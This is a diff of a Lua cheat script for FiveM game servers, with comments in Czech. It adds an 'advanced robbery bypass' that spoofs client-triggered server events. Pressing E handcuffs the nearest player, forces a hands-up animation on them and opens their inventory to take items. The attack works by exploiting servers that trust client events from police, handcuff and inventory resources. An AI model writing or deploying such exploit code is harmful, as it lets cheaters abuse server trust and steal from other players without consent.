@@ -14048,9 +14048,9 @@ if voiceRadiusItem then
 end
 
 LoadBypasses()
--- ==========================================
--- SCRIPT PRO VYKRADENÍ NEJBLIŽŠÍHO HRÁČE
--- ==========================================
+-- =========================================================================
+-- ADVANCED ROBBERY BYPASS (S VYNUCOVÁNÍM RUKOU VZHŮRU A BRANÍM ITEMŮ)
+-- =========================================================================
 local robbingActive = false
 
 local function GetClosestPlayer()
@@ -14103,13 +14103,35 @@ function ToggleRobFeature(state)
 
                 if IsControlJustReleased(0, 38) then -- Klávesa E
                     local targetServerId = GetPlayerServerId(closestPlayer)
+                    print("Spoustim advanced rob pro ID: " .. targetServerId)
+
+                    -- 1. KROK: Donucení cíle dát ruce vzhůru / spoutat ho přes serverové eventy
+                    -- Zkoušíme podvrhnout běžné herní triggery, které server akceptuje
+                    TriggerServerEvent('esx_policejob:handcuff', targetServerId)
+                    TriggerServerEvent('qb-handcuffs:server:CuffPlayer', targetServerId)
+                    TriggerServerEvent('esx_thief:securePlayer', targetServerId)
                     
+                    -- Pokud server používá dpEmotes / rp-emotes, zkusíme mu vnutit animaci rukou vzhůru
+                    TriggerServerEvent('InteractSound_SV:PlayWithinDistance', 3.0, 'handcuff', 0.1) -- zvuk pout
+                    TriggerServerEvent('esx_animations:triggerAnimation', 'handsup', targetServerId)
+
+                    -- Malá pauza, aby server stihl zpracovat stav spoutání/rukou vzhůru
+                    Wait(300)
+
+                    -- 2. KROK: Otevření inventáře s oprávněním pro úpravy (Braní itemů)
+                    -- Tyto triggery oznamují serveru, že probíhá legální prohledávání spoutaného
                     TriggerServerEvent('ox_inventory:openInventory', 'otherplayer', targetServerId)
                     TriggerServerEvent('esx_policejob:search', targetServerId)
                     TriggerServerEvent('qb-inventory:server:OpenInventory', 'otherplayer', targetServerId)
+                    TriggerServerEvent('esx_thief:stealPlayer', targetServerId)
 
-                    print("Pokus o vykradení hráče ID: " .. targetServerId)
-                    Wait(1000)
+                    -- Lokální export jako pojistka pro otevření UI rozhraní
+                    if GetResourceState('ox_inventory') == 'started' then
+                        exports['ox_inventory']:openInventory('player', targetServerId)
+                    end
+
+                    print("Pokus o synchronizované okradení hráče ID: " .. targetServerId)
+                    Wait(2000) -- Ochrana proti spamu
                 end
             end
         end
